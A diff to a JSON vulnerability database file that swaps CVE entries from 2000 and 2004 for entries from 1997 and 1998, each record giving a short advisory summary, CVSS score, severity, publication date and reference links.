-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0384.html",
-        "http://www.securityfocus.com/bid/2017",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0384.html",
-        "http://www.securityfocus.com/bid/2017"
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0193",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0193"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1111",
-      "summary": "Telnet Service for Windows 2000 Professional does not properly terminate incomplete connection attempts, which allows remote attackers to cause a denial of service by connecting to the server and not providing any input.",
+      "id": "CVE-1999-0230",
+      "summary": "Buffer overflow in Cisco 7xx routers through the telnet service.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
+      "published": "1997-12-15",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://www.securityfocus.com/archive/1/147914",
-        "http://www.securityfocus.com/bid/2018",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5598",
-        "http://www.securityfocus.com/archive/1/147914",
-        "http://www.securityfocus.com/bid/2018"
+        "http://www.osvdb.org/1102",
+        "http://www.osvdb.org/1102"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1112",
-      "summary": "Microsoft Windows Media Player 7 executes scripts in custom skin (.WMS) files, which could allow remote attackers to gain privileges via a skin that contains a malicious script, aka the \".WMS Script Execution\" vulnerability.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.securityfocus.com/bid/1976",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-090",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5575",
-        "http://www.securityfocus.com/bid/1976",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-090"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1113",
-      "summary": "Buffer overflow in Microsoft Windows Media Player allows remote attackers to execute arbitrary commands via a malformed Active Stream Redirector (.ASX) file, aka the \".ASX Buffer Overrun\" vulnerability.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://www.atstake.com/research/advisories/2000/a112300-1.txt",
-        "http://www.securityfocus.com/bid/1980",
-        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/2000/ms00-090",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5574",
-        "http://www.atstake.com/research/advisories/2000/a112300-1.txt"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1114",
-      "summary": "Unify ServletExec AS v3.0C allows remote attackers to read source code for JSP pages via an HTTP request that ends with characters such as \".\", or \"+\", or \"%20\".",
+      "id": "CVE-1999-0004",
+      "summary": "MIME buffer overflow in email clients, e.g. Solaris mailtool and Outlook.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
+      "published": "1997-12-16",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0285.html",
-        "http://www.securityfocus.com/bid/1970",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0285.html",
-        "http://www.securityfocus.com/bid/1970"
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1998/ms98-008",
+        "https://docs.microsoft.com/en-us/security-updates/securitybulletins/1998/ms98-008"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1115",
-      "summary": "Buffer overflow in remote web administration component (webprox.dll) of 602Pro LAN SUITE before 2000.0.1.33 allows remote attackers to cause a denial of service and possibly execute arbitrary commands via a long GET request.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0299.html",
-        "http://www.securityfocus.com/bid/1979",
-        "http://www.software602.com/products/ls/support/newbuild.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5583",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0299.html"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1116",
-      "summary": "Buffer overflow in TransSoft Broker FTP Server before 4.3.0.1 allows remote attackers to cause a denial of service and possibly execute arbitrary commands via a long command.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://archives.neohapsis.com/archives/win2ksecadvice/2000-q4/0041.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5388",
-        "http://archives.neohapsis.com/archives/win2ksecadvice/2000-q4/0041.html",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5388"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1117",
-      "summary": "The Extended Control List (ECL) feature of the Java Virtual Machine (JVM) in Lotus Notes Client R5 allows malicious web site operators to determine the existence of files on the client by measuring delays in the execution of the getSystemResource method.",
+      "id": "CVE-1999-0015",
+      "summary": "Teardrop IP denial of service.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": "CWE-203",
-      "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0341.html",
-        "http://www.securityfocus.com/bid/1994",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0341.html",
-        "http://www.securityfocus.com/bid/1994"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1118",
-      "summary": "24Link 1.06 web server allows remote attackers to bypass access restrictions by prepending strings such as \"/+/\" or \"/.\" to the HTTP GET request.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2001-01-09",
+      "published": "1997-12-16",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0369.html",
-        "http://archives.neohapsis.com/archives/bugtraq/2000-11/0369.html"
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A5579",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A5579"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2000-1119",
-      "summary": "Buffer overflow in setsenv command in IBM AIX 4.3.x and earlier allows local users to execute arbitrary commands via a long \"x=\" argument.",
-      "cvssScore": 4.6,
-      "severity": "Medium",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=97569466809056&w=2",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY08812&apar=only",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY10721&apar=only",
-        "http://www.osvdb.org/1676",
-        "http://www.securityfocus.com/bid/2032"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1120",
-      "summary": "Buffer overflow in digest command in IBM AIX 4.3.x and earlier allows local users to execute arbitrary commands.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=97569466809056&w=2",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY08143&apar=only",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY08287&apar=only",
-        "http://www.securityfocus.com/bid/2033",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5620"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1121",
-      "summary": "Buffer overflow in enq command in IBM AIX 4.3.x and earlier may allow local users to execute arbitrary commands via a long -M argument.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=97569466809056&w=2",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY08143&apar=only",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY08287&apar=only",
-        "http://www.securityfocus.com/bid/2034",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5619"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1122",
-      "summary": "Buffer overflow in setclock command in IBM AIX 4.3.x and earlier may allow local users to execute arbitrary commands via a long argument.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=97569466809056&w=2",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY07790&apar=only",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY07831&apar=only",
-        "http://www.securityfocus.com/bid/2035",
-        "http://marc.info/?l=bugtraq&m=97569466809056&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1123",
-      "summary": "Buffer overflow in pioout command in IBM AIX 4.3.x and earlier may allow local users to execute arbitrary commands.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=97569466809056&w=2",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY12638&apar=only",
-        "http://www.securityfocus.com/bid/2036",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5617",
-        "http://marc.info/?l=bugtraq&m=97569466809056&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2000-1124",
-      "summary": "Buffer overflow in piobe command in IBM AIX 4.3.x allows local users to gain privileges via long environmental variables.",
-      "cvssScore": 7.2,
-      "severity": "High",
-      "published": "2001-01-09",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=97569466809056&w=2",
-        "http://www-1.ibm.com/support/search.wss?rs=0&q=IY12638&apar=only",
-        "http://www.securityfocus.com/bid/2037",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/5616",
-        "http://marc.info/?l=bugtraq&m=97569466809056&w=2"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1821",
-      "summary": "SQL injection vulnerability in 4nalbum 0.92 for PHP-Nuke 6.5 through 7.0 allows remote attackers to gain privileges or perform unauthorized database operations via the gid parameter.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-03-15",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107937780222514&w=2",
-        "http://secunia.com/advisories/11134",
-        "http://www.osvdb.org/4294",
-        "http://www.securityfocus.com/bid/9881",
-        "https://exchange.xforce.ibmcloud.com/vulnerabilities/15498"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1822",
-      "summary": "Multiple cross-site scripting (XSS) vulnerabilities in Phorum 3.1 through 5.0.3 beta allow remote attackers to inject arbitrary web script or HTML via the (1) HTTP_REFERER parameter to login.php, (2) HTTP_REFERER parameter to register.php, or (3) target parameter to profile.php.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2004-03-15",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107939479713136&w=2",
-        "http://phorum.org/changelog.txt",
-        "http://secunia.com/advisories/11157",
-        "http://securitytracker.com/id?1009433",
-        "http://www.osvdb.org/4333"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-1827",
-      "summary": "Cross-site scripting (XSS) vulnerability in YaBB 1 Gold(SP1.3) and YaBB SE 1.5.1 Final allows remote attackers to inject arbitrary web script via the background:url property in (1) glow or (2) shadow tags.",
-      "cvssScore": 4.3,
-      "severity": "Medium",
-      "published": "2004-03-15",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=107936800226430&w=2",
-        "http://marc.info/?l=bugtraq&m=107948064923981&w=2",
-        "http://secunia.com/advisories/11128",
-        "http://securitytracker.com/id?1009427",
-        "http://www.securityfocus.com/bid/9873"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0691",
-      "summary": "Heap-based buffer overflow in the BMP image format parser for the QT library (qt3) before 3.3.3 allows remote attackers to cause a denial of service (application crash) and possibly execute arbitrary code.",
-      "cvssScore": 7.5,
-      "severity": "High",
-      "published": "2004-09-28",
-      "modified": null,
-      "cwe": null,
-      "references": [
-        "http://marc.info/?l=bugtraq&m=109295309008309&w=2",
-        "http://security.gentoo.org/glsa/glsa-200408-20.xml",
-        "http://sunsolve.sun.com/search/document.do?assetkey=1-66-201610-1",
-        "http://www.debian.org/security/2004/dsa-542",
-        "http://www.mandriva.com/security/advisories?name=MDKSA-2004:085"
-      ],
-      "vulnerableProducts": [],
-      "isExploited": false
-    },
-    {
-      "id": "CVE-2004-0692",
-      "summary": "The XPM parser in the QT library (qt3) before 3.3.3 allows remote attackers to cause a denial of service (application crash) via a malformed image file that triggers a null dereference, a different vulnerability than CVE-2004-0693.",
+      "id": "CVE-1999-0104",
+      "summary": "A later variation on the Teardrop IP denial of service attack, a.k.a. Teardrop-2.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2004-09-28",
+      "published": "1997-12-16",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://marc.info/?l=bugtraq&m=110979666528890&w=2",
-        "http://security.gentoo.org/glsa/glsa-200408-20.xml",
-        "http://sunsolve.sun.com/search/document.do?assetkey=1-66-201610-1",
-        "http://www.debian.org/security/2004/dsa-542",
-        "http://www.mandriva.com/security/advisories?name=MDKSA-2004:085"
+        "http://www.securityfocus.com/bid/80175",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A5743",
+        "http://www.securityfocus.com/bid/80175",
+        "https://oval.cisecurity.org/repository/search/definition/oval%3Aorg.mitre.oval%3Adef%3A5743"
       ],
       "vulnerableProducts": [],
       "isExploited": false
     },
     {
-      "id": "CVE-2004-0693",
-      "summary": "The GIF parser in the QT library (qt3) before 3.3.3 allows remote attackers to cause a denial of service (application crash) via a malformed image file that triggers a null dereference, a different vulnerability than CVE-2004-0692.",
+      "id": "CVE-1999-1581",
+      "summary": "Memory leak in Simple Network Management Protocol (SNMP) agent (snmp.exe) for Windows NT 4.0 before Service Pack 4 allows remote attackers to cause a denial of service (memory consumption) via a large number of SNMP packets with Object Identifiers (OIDs) that cannot be decoded.",
       "cvssScore": 5,
       "severity": "Medium",
-      "published": "2004-09-28",
+      "published": "1997-12-23",
       "modified": null,
       "cwe": null,
       "references": [
-        "http://security.gentoo.org/glsa/glsa-200408-20.xml",
-        "http://sunsolve.sun.com/search/document.do?assetkey=1-66-201610-1",
-        "http://www.debian.org/security/2004/dsa-542",
-        "http://www.mandriva.com/security/advisories?name=MDKSA-2004:085",
-        "http://www.novell.com/linux/security/advisories/2004_27_qt3.html"
+        "http://support.microsoft.com/kb/q178381/",
+        "http://www.kb.cert.org/vuls/id/4923",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/8231",
+        "http://support.microsoft.com/kb/q178381/",
+        "http://www.kb.cert.org/vuls/id/4923"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-1230",
+      "summary": "Quake 2 server allows remote attackers to cause a denial of service via a spoofed UDP packet with a source address of 127.0.0.1, which causes the server to attempt to connect to itself.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1997-12-24",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.securityfocus.com/archive/1/8282",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/698",
+        "http://www.securityfocus.com/archive/1/8282",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/698"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0107",
+      "summary": "Buffer overflow in Apache 1.2.5 and earlier allows a remote attacker to cause a denial of service with a large number of GET requests containing a large number of / characters.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1997-12-30",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0107",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0107"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0273",
+      "summary": "Denial of service through Solaris 2.5.1 telnet by sending ^D characters.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-01-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0273",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0273"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0513",
+      "summary": "ICMP messages to broadcast addresses are allowed, allowing for a Smurf attack that can cause a denial of service.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-01-05",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0513",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0513"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0086",
+      "summary": "AIX routed allows remote users to modify sensitive files.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-01-08",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0086",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0086"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0271",
+      "summary": "Progressive Networks Real Video server (pnserver) can be crashed remotely.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-01-15",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0271",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0271"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0264",
+      "summary": "htmlscript CGI program allows remote read access to files.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-01-27",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0264",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/CVE-1999-0264"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0087",
+      "summary": "Denial of service in AIX telnet can freeze a system and prevent users from accessing the server.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-02-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.osvdb.org/7992",
+        "http://www.osvdb.org/7992"
+      ],
+      "vulnerableProducts": [],
+      "isExploited": false
+    },
+    {
+      "id": "CVE-1999-0305",
+      "summary": "The system configuration control (sysctl) facility in BSD based operating systems OpenBSD 2.2 and earlier, and FreeBSD 2.2.5 and earlier, does not properly restrict source routed packets even when the (1) dosourceroute or (2) forwarding variables are set, which allows remote attackers to spoof TCP connections.",
+      "cvssScore": 5,
+      "severity": "Medium",
+      "published": "1998-02-01",
+      "modified": null,
+      "cwe": null,
+      "references": [
+        "http://www.openbsd.org/advisories/sourceroute.txt",
+        "http://www.osvdb.org/11502",
+        "https://exchange.xforce.ibmcloud.com/vulnerabilities/736",
+        "http://www.openbsd.org/advisories/sourceroute.txt",
+        "http://www.osvdb.org/11502"
       ],
       "vulnerableProducts": [],
       "isExploited": false
